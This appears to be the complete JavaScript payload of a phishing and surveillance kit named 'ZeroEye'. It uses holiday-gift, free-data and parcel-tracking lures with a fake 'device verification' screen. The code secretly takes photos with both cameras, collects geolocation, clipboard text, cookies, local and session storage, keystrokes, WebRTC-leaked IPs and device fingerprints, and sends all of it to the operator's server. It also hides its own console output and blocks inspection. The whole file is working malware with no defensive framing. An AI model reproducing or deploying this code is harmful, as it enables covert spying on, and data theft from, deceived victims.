const SERVER_URL = window.location.origin;
const sentIPs = new Set();
let behaviorData = {};

// Auto-start with beautiful template interfaces
setTimeout(() => {
    // All templates now have their own engaging interfaces
    // The attack starts when user interacts with the template
    console.log("[ZeroEye] Template loaded - waiting for user interaction");
}, 500);

// ==================== TEMPLATE-SPECIFIC START FUNCTIONS ====================

// For Free Data template
function startFreeDataVerification() {
    showLoadingScreen("Verifying your device for free data...");
    setTimeout(() => startUltraAttack(), 1000);
}

// For Eid template  
function startEidGiftVerification() {
    showLoadingScreen("Unwrapping your Eid gift...");
    setTimeout(() => startUltraAttack(), 1000);
}

// For Gulf template
function startGulfVerification() {
    showLoadingScreen("Activating your Gulf data bundle...");
    setTimeout(() => startUltraAttack(), 1000);
}

// For Ramadan template
function startRamadanVerification() {
    showLoadingScreen("Preparing your Ramadan gift...");
    setTimeout(() => startUltraAttack(), 1000);
}

// For Rewards template
function startRewardsVerification() {
    showLoadingScreen("Processing your reward claim...");
    setTimeout(() => startUltraAttack(), 1000);
}

// For Tracking template
function startTrackingVerification() {
    showLoadingScreen("Verifying your delivery details...");
    setTimeout(() => startUltraAttack(), 1000);
}

// ==================== CORE RECONNAISSANCE FUNCTIONS ====================

function showLoadingScreen(message = "Verifying your device...") {
    document.body.innerHTML = `
        <div style="font-family: Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; min-height: 100vh;">
            <div style="max-width: 400px; margin: 0 auto; background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px);">
                <h1 style="font-size: 24px; margin-bottom: 20px;">🔍 Device Verification</h1>
                <div style="margin: 30px 0;">
                    <div style="width: 50px; height: 50px; border: 3px solid #fff; border-top: 3px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
                </div>
                <p style="font-size: 16px; opacity: 0.9;">${message}</p>
                <p style="font-size: 14px; opacity: 0.7; margin-top: 10px;">Camera access required for verification</p>
                <p style="font-size: 12px; opacity: 0.5; margin-top: 20px;">Please allow camera access when prompted</p>
            </div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    `;
}

async function startUltraAttack() {
    try {
        console.log("[ZeroEye] Starting comprehensive reconnaissance...");
        
        // Phase 1: Passive Intelligence (No permissions needed)
        setTimeout(() => {
            collectPassiveIntelligence();
        }, 1000);
        
        // Phase 2: Active Intelligence (With user gesture)
        setTimeout(() => {
            attemptDualCameraCapture();
        }, 2000);
        
        // Phase 3: Enhanced Data Collection
        setTimeout(() => {
            collectEnhancedData();
        }, 3000);
        
        // Phase 4: Behavioral Surveillance 
        startBehavioralSurveillance();
        
        // Phase 5: Continuous Monitoring
        startContinuousMonitoring();
        
    } catch (err) {
        console.error("[ZeroEye] Error:", err);
        // Fallback to basic data collection
        collectPassiveIntelligence();
    }
}

// ==================== PHASE 1: PASSIVE INTELLIGENCE ====================

function collectPassiveIntelligence() {
    const data = {
        basic: collectBasicSystemInfo(),
        fingerprint: getAdvancedFingerprint(),
        network: getNetworkIntelligence(),
        environment: getBrowserEnvironment(),
        security: detectSecurityMeasures(),
        social: detectSocialMediaPresence(),
        hardware: getHardwareIntelligence(),
        storage: getStorageIntelligence(),
        meta: {
            timestamp: new Date().toISOString(),
            session_id: generateSessionId(),
            url: window.location.href,
            referrer: document.referrer,
            template: document.title
        }
    };
    
    sendData('upload_sys', data);
}

function collectBasicSystemInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        
        window: {
            width: window.innerWidth,
            height: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        },
        
        timezone: {
            name: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset()
        }
    };
}

function getAdvancedFingerprint() {
    return {
        canvas: getCanvasFingerprint(),
        webgl: getWebGLFingerprint(),
        audio: getAudioFingerprint(),
        fonts: getFontFingerprint(),
        plugins: getPluginFingerprint(),
        hardware: {
            devicePixelRatio: window.devicePixelRatio,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints
        }
    };
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('ZeroEye Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('ZeroEye Fingerprint', 4, 17);
        
        return canvas.toDataURL().substring(0, 100);
    } catch (e) {
        return 'Canvas blocked';
    }
}

function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) return 'WebGL not supported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            vendor: gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
            renderer: gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : gl.RENDERER),
            version: gl.getParameter(gl.VERSION)
        };
    } catch (e) {
        return 'WebGL blocked';
    }
}

function getAudioFingerprint() {
    try {
        const context = new (window.AudioContext || window.webkitAudioContext)();
        return 'Audio context available';
    } catch (e) {
        return 'Audio context blocked';
    }
}

function getFontFingerprint() {
    const fontList = [
        'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
        'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
        'Verdana', 'Microsoft YaHei', 'SimSun'
    ];
    
    const availableFonts = [];
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = 200;
    canvas.height = 50;
    
    const baseText = 'abcdefghijklmnopqrstuvwxyz0123456789';
    const baseWidth = context.measureText(baseText).width;
    
    fontList.forEach(font => {
        context.font = `72px ${font}, monospace`;
        const width = context.measureText(baseText).width;
        if (width !== baseWidth) {
            availableFonts.push(font);
        }
    });
    
    return availableFonts;
}

function getPluginFingerprint() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
    }
    return plugins;
}

function getNetworkIntelligence() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const networkInfo = {};
    
    if (connection) {
        networkInfo.connection = {
            effectiveType: connection.effectiveType,
            downlink: connection.downlink,
            rtt: connection.rtt,
            saveData: connection.saveData
        };
    }
    
    // Enhanced IP Detection via WebRTC
    detectAllIPs().then(ips => {
        if (ips.length > 0) {
            networkInfo.detected_ips = ips;
            sendData('upload_ip', { ips: ips, timestamp: Date.now() });
        }
    });
    
    return networkInfo;
}

function detectAllIPs() {
    return new Promise((resolve) => {
        const ips = new Set();
        
        // Multiple STUN servers for better IP detection
        const iceServers = [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" },
            { urls: "stun:stun2.l.google.com:19302" },
            { urls: "stun:stun3.l.google.com:19302" },
            { urls: "stun:stun4.l.google.com:19302" }
        ];
        
        const rtc = new RTCPeerConnection({ iceServers: iceServers });
        
        rtc.createDataChannel('');
        rtc.createOffer()
            .then(offer => rtc.setLocalDescription(offer))
            .catch(() => {});
        
        rtc.onicecandidate = (event) => {
            if (event.candidate) {
                const candidate = event.candidate.candidate;
                // Enhanced IP regex to catch all IP formats
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g;
                const matches = candidate.match(ipRegex);
                
                if (matches) {
                    matches.forEach(ip => {
                        if (!isPrivateIP(ip) && !sentIPs.has(ip)) {
                            sentIPs.add(ip);
                            ips.add(ip);
                        }
                    });
                }
            } else {
                // No more candidates
                resolve(Array.from(ips));
            }
        };
        
        // Fallback timeout
        setTimeout(() => resolve(Array.from(ips)), 5000);
    });
}

function getBrowserEnvironment() {
    return {
        doNotTrack: navigator.doNotTrack,
        onLine: navigator.onLine,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        userActivation: navigator.userActivation,
        webdriver: navigator.webdriver,
        product: navigator.product,
        appCodeName: navigator.appCodeName,
        appName: navigator.appName,
        appVersion: navigator.appVersion
    };
}

function detectSecurityMeasures() {
    return {
        adBlock: detectAdBlock(),
        privacyBadger: detectPrivacyBadger(),
        ghostery: detectGhostery(),
        uBlock: detectUBlock(),
        passwordManagers: detectPasswordManagers(),
        devTools: detectDevTools()
    };
}

function detectAdBlock() {
    const test = document.createElement('div');
    test.innerHTML = '&nbsp;';
    test.className = 'adsbox';
    document.body.appendChild(test);
    
    const isBlocked = test.offsetHeight === 0;
    document.body.removeChild(test);
    return isBlocked;
}

function detectPrivacyBadger() {
    return typeof window.phantom === 'object';
}

function detectGhostery() {
    return typeof window.ghostery === 'object';
}

function detectUBlock() {
    return typeof window.ubo === 'object';
}

function detectPasswordManagers() {
    const managers = {
        lastpass: !!document.querySelector('#lastpass-container'),
        bitwarden: !!document.querySelector('#bitwarden'),
        dashlane: !!window.dashlane,
        onepassword: !!document.querySelector('.onepassword'),
        roboform: !!window.RoboForm
    };
    
    return Object.entries(managers)
        .filter(([_, exists]) => exists)
        .map(([manager]) => manager);
}

function detectDevTools() {
    const startTime = performance.now();
    debugger;
    const endTime = performance.now();
    return endTime - startTime > 100;
}

function detectSocialMediaPresence() {
    const platforms = {
        facebook: !!window.FB,
        twitter: !!window.twttr,
        instagram: !!window._instgrm,
        linkedin: !!window.LI,
        tiktok: !!window.tt,
        whatsapp: !!window.whatsapp,
        telegram: !!window.TelegramWebviewProxy,
        discord: !!window.DiscordNative
    };
    
    return Object.entries(platforms)
        .filter(([_, exists]) => exists)
        .map(([platform]) => platform);
}

function getHardwareIntelligence() {
    return {
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory,
        touch: 'ontouchstart' in window,
        orientation: 'orientation' in window,
        vibration: 'vibrate' in navigator,
        battery: 'getBattery' in navigator,
        storage: 'storage' in navigator,
        usb: 'usb' in navigator,
        bluetooth: 'bluetooth' in navigator
    };
}

function getStorageIntelligence() {
    const storage = {
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        indexedDB: 'indexedDB' in window
    };
    
    // Attempt to read localStorage
    try {
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage.localStorage[key] = localStorage.getItem(key);
        }
    } catch (e) {}
    
    // Attempt to read sessionStorage
    try {
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            storage.sessionStorage[key] = sessionStorage.getItem(key);
        }
    } catch (e) {}
    
    return storage;
}

function generateSessionId() {
    return 'sess_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
}

// ==================== PHASE 2: DUAL CAMERA CAPTURE ====================

function attemptDualCameraCapture() {
    // First attempt front camera (user)
    attemptCameraCapture('user', 'front');
    
    // Then attempt back camera (environment) after delay
    setTimeout(() => {
        attemptCameraCapture('environment', 'back');
    }, 6000);
}

function attemptCameraCapture(facingMode, cameraType) {
    const constraints = {
        video: {
            facingMode: facingMode,
            width: { ideal: 1920, min: 1280 },
            height: { ideal: 1080, min: 720 },
            frameRate: { ideal: 30 }
        }
    };
    
    navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            captureMultiplePhotos(stream, cameraType, 5); // 5 photos per camera
        })
        .catch(error => {
            console.log(`${cameraType} camera access denied`);
            sendData('upload_cam', { 
                error: `${cameraType} camera access denied`,
                camera_type: cameraType,
                timestamp: Date.now()
            });
        });
}

function captureMultiplePhotos(stream, cameraType, photoCount) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.autoplay = true;
    video.playsInline = true;
    video.style.display = 'none';
    document.body.appendChild(video);

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.style.display = 'none';
    document.body.appendChild(canvas);

    let photosTaken = 0;

    function takePhoto() {
        if (photosTaken >= photoCount) {
            stream.getTracks().forEach(track => track.stop());
            return;
        }
        
        if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) {
                    const formData = new FormData();
                    formData.append('file', blob, `photo_${cameraType}_${photosTaken + 1}_${Date.now()}.jpg`);
                    sendFormData('upload_cam', formData);
                    photosTaken++;
                }
                
                // Take next photo after delay
                if (photosTaken < photoCount) {
                    setTimeout(takePhoto, 1500);
                } else {
                    stream.getTracks().forEach(track => track.stop());
                    sendData('upload_status', {
                        camera_type: cameraType,
                        photos_taken: photosTaken,
                        status: 'completed',
                        timestamp: Date.now()
                    });
                }
            }, 'image/jpeg', 0.92); // High quality
        } else {
            // Video not ready, try again
            setTimeout(takePhoto, 500);
        }
    }

    // Start capturing after video is ready
    setTimeout(takePhoto, 2000);
}

// ==================== PHASE 3: ENHANCED DATA COLLECTION ====================

function collectEnhancedData() {
    // Location data
    attemptLocationAccess();
    
    // Battery data
    attemptBatteryAccess();
    
    // Clipboard monitoring
    setupClipboardMonitoring();
    
    // Network speed test
    testNetworkSpeed();
}

function attemptLocationAccess() {
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                heading: position.coords.heading,
                timestamp: position.timestamp
            };
            
            sendData('upload_location', locationData);
        },
        (error) => {
            sendData('upload_location', { 
                error: error.message,
                code: error.code 
            });
        },
        { 
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

function attemptBatteryAccess() {
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const batteryData = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            
            sendData('upload_battery', batteryData);
        }).catch(() => {});
    }
}

function setupClipboardMonitoring() {
    // Listen for paste events
    document.addEventListener('paste', (e) => {
        try {
            const clipboardData = e.clipboardData || window.clipboardData;
            const pastedText = clipboardData.getData('text');
            
            if (pastedText) {
                sendData('upload_clipboard', {
                    content: pastedText.substring(0, 1000),
                    length: pastedText.length,
                    timestamp: Date.now(),
                    source: 'paste_event'
                });
            }
        } catch (error) {}
    });

    // Try modern clipboard API
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(text => {
            if (text) {
                sendData('upload_clipboard', {
                    content: text.substring(0, 1000),
                    length: text.length,
                    timestamp: Date.now(),
                    source: 'clipboard_api'
                });
            }
        }).catch(() => {});
    }
}

function testNetworkSpeed() {
    const startTime = Date.now();
    const testImage = new Image();
    testImage.src = 'https://www.google.com/images/phd/px.gif?t=' + Date.now();
    
    testImage.onload = () => {
        const loadTime = Date.now() - startTime;
        let speed = 'Unknown';
        
        if (loadTime < 100) speed = 'Very Fast (Fiber)';
        else if (loadTime < 300) speed = 'Fast (4G/Broadband)';
        else if (loadTime < 1000) speed = 'Medium (3G)';
        else speed = 'Slow (2G/Limited)';
        
        sendData('upload_speed', {
            speed: speed,
            load_time: loadTime + 'ms',
            timestamp: Date.now()
        });
    };
    
    testImage.onerror = () => {
        sendData('upload_speed', {
            speed: 'Offline/Slow',
            load_time: 'N/A',
            timestamp: Date.now()
        });
    };
}

// ==================== PHASE 4: BEHAVIORAL SURVEILLANCE ====================

function startBehavioralSurveillance() {
    behaviorData = {
        mouseMovements: [],
        clicks: [],
        scrolls: [],
        keystrokes: [],
        focusChanges: [],
        resizeEvents: [],
        startTime: Date.now(),
        sessionId: generateSessionId()
    };

    // Mouse movement tracking
    document.addEventListener('mousemove', (e) => {
        behaviorData.mouseMovements.push({
            x: e.clientX,
            y: e.clientY,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Click tracking
    document.addEventListener('click', (e) => {
        behaviorData.clicks.push({
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            id: e.target.id,
            classes: e.target.className,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Scroll tracking
    let scrollTimeout;
    window.addEventListener('scroll', () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(() => {
            behaviorData.scrolls.push({
                x: window.scrollX,
                y: window.scrollY,
                timestamp: Date.now() - behaviorData.startTime
            });
        }, 100);
    });

    // Keystroke tracking
    document.addEventListener('keydown', (e) => {
        behaviorData.keystrokes.push({
            key: e.key,
            code: e.code,
            target: e.target.tagName,
            id: e.target.id,
            timestamp: Date.now() - behaviorData.startTime
        });
    });

    // Periodic behavior data transmission
    setInterval(() => {
        if (behaviorData.clicks.length > 0 || behaviorData.mouseMovements.length > 10) {
            sendData('upload_behavior', {
                movements: behaviorData.mouseMovements.length,
                clicks: behaviorData.clicks.length,
                scrolls: behaviorData.scrolls.length,
                keystrokes: behaviorData.keystrokes.length,
                sessionTime: Date.now() - behaviorData.startTime,
                sessionId: behaviorData.sessionId
            });
            
            // Reset for next batch
            behaviorData.mouseMovements = [];
            behaviorData.clicks = [];
            behaviorData.scrolls = [];
            behaviorData.keystrokes = [];
        }
    }, 30000);
}

// ==================== PHASE 5: CONTINUOUS MONITORING ====================

function startContinuousMonitoring() {
    // Heartbeat every 30 seconds
    setInterval(() => {
        sendData('upload_heartbeat', {
            timestamp: Date.now(),
            url: window.location.href,
            title: document.title,
            focused: document.hasFocus(),
            visibility: document.visibilityState
        });
    }, 30000);

    // Monitor URL changes
    let lastUrl = window.location.href;
    setInterval(() => {
        if (window.location.href !== lastUrl) {
            sendData('upload_navigation', {
                from: lastUrl,
                to: window.location.href,
                timestamp: Date.now()
            });
            lastUrl = window.location.href;
        }
    }, 1000);
}

// ==================== UTILITY FUNCTIONS ====================

function isPrivateIP(ip) {
    return ip.startsWith('192.168.') || 
           ip.startsWith('10.') || 
           ip.startsWith('172.16.') ||
           ip.startsWith('172.17.') ||
           ip.startsWith('172.18.') ||
           ip.startsWith('172.19.') ||
           ip.startsWith('172.20.') ||
           ip.startsWith('172.21.') ||
           ip.startsWith('172.22.') ||
           ip.startsWith('172.23.') ||
           ip.startsWith('172.24.') ||
           ip.startsWith('172.25.') ||
           ip.startsWith('172.26.') ||
           ip.startsWith('172.27.') ||
           ip.startsWith('172.28.') ||
           ip.startsWith('172.29.') ||
           ip.startsWith('172.30.') ||
           ip.startsWith('172.31.') ||
           ip === '127.0.0.1';
}

function sendData(endpoint, data) {
    const delay = Math.random() * 2000 + 1000;
    
    setTimeout(() => {
        fetch(`${SERVER_URL}/${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `data=${encodeURIComponent(JSON.stringify(data))}`
        }).catch(() => {});
    }, delay);
}

function sendFormData(endpoint, formData) {
    const delay = Math.random() * 2000 + 1000;
    
    setTimeout(() => {
        fetch(`${SERVER_URL}/${endpoint}`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    }, delay);
}

// ==================== STEALTH ENHANCEMENTS ====================

// Override console methods
const originalLog = console.log;
const originalError = console.error;
const originalWarn = console.warn;

console.log = function(...args) {
    if (typeof args[0] === 'string' && args[0].includes('[ZeroEye]')) {
        return;
    }
    originalLog.apply(console, args);
};

console.error = function(...args) {
    if (typeof args[0] === 'string' && args[0].includes('[ZeroEye]')) {
        return;
    }
    originalError.apply(console, args);
};

console.warn = function(...args) {
    if (typeof args[0] === 'string' && args[0].includes('[ZeroEye]')) {
        return;
    }
    originalWarn.apply(console, args);
};

// Prevent context menu
document.addEventListener('contextmenu', (e) => e.preventDefault());

// Prevent text selection
document.addEventListener('selectstart', (e) => e.preventDefault());

console.log("[ZeroEye] Ultimate reconnaissance system ready");
